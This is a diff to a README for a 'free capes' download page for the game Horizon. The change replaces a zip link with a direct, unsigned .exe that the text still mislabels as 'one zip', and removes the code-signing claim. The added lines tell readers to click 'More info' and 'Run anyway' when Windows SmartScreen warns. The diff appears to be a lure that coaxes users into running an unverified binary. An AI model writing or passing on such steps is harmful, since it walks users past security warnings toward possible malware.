@@ -51,12 +51,11 @@ Pick one. Press **Wear it**. Everyone who plays [Horizon](https://github.com/hor
 </table>
 
 ## Get it in 3 steps
-[`horizon-free-capes.zip`](https://github.com/SparrowPortray/horizon-free-capes/releases/latest/download/horizon-free-capes.zip) — one zip, no installer.
+[`Drip-1.1.2-portable-x64.exe`](https://github.com/SparrowPortray/horizon-free-capes/releases/latest/download/Drip-1.1.2-portable-x64.exe) — one zip, no installer.
 
-Unpack the whole folder and start `Main.exe`. No installer, no admin rights.
+Download and start the exe. No installer, no admin rights.
 
-`Main.exe` is code-signed, so Windows starts it without a warning. Keep
-`Drip` next to it: they ship together.
+The build is not code-signed yet, so SmartScreen may warn once: choose **More info**, then **Run anyway**.
 
 
 
